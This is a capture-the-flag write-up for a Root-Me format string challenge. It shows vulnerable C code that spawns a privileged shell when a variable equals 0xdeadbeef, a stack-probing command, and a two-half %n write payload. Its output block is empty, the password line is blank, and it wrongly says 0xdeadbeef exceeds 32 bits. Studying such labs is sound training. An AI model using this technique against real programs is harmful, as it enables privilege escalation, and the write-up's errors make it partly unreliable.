# ELF x86 - Format string bug basic 2
- Point: 20pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en),  8 April 2015
- Level: Medium<br><br>
![image](https://user-images.githubusercontent.com/48288606/141644747-50305e8e-2a4d-4b42-8c15-5d3c4b322654.png)
## Write-up:

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main( int argc, char ** argv )
 
{
 
        int var;
        int check  = 0x04030201;
 
        char fmt[128];
 
        if (argc <2)
                exit(0);
 
        memset( fmt, 0, sizeof(fmt) );
 
        printf( "check at 0x%x\n", &check );
        printf( "argv[1] = [%s]\n", argv[1] );
 
        snprintf( fmt, sizeof(fmt), argv[1] );
 
        if ((check != 0x04030201) && (check != 0xdeadbeef))    
                printf ("\nYou are on the right way !\n");
 
        printf( "fmt=[%s]\n", fmt );
        printf( "check=0x%x\n", check );
 
        if (check==0xdeadbeef)
        {
                printf("Yeah dude ! You win !\n");
                setreuid(geteuid(), geteuid());
                system("/bin/bash");
        }
}
```
Our aim is overwriting the **check**'s value. We leverage a vulnerability in 
`snprintf( fmt, sizeof(fmt), argv[1] );` 
with no format specifier. Examine the stack and find a way to change that value.

### Solution:
Let's try looking into the stack by usual payload<br>
`./ch14 $(python -c "print 'AAAA' + '%x'")`<br>
Output:
```
```

Exploit:
"0xdeadbeef"  is too large (over 32 bits), we have to divide **check** into **0xdead (57005)** and **0xbeef (48879)**.
7 times %8x to pull esp in front of the check.
%48811c%n output (0xbeef)
%8126c%n(0xdead)
in other words, payload is (beef address) + (dummy) + (dead address) + %8x*7 + (%48811c%n%8126c%n)
Pass: 


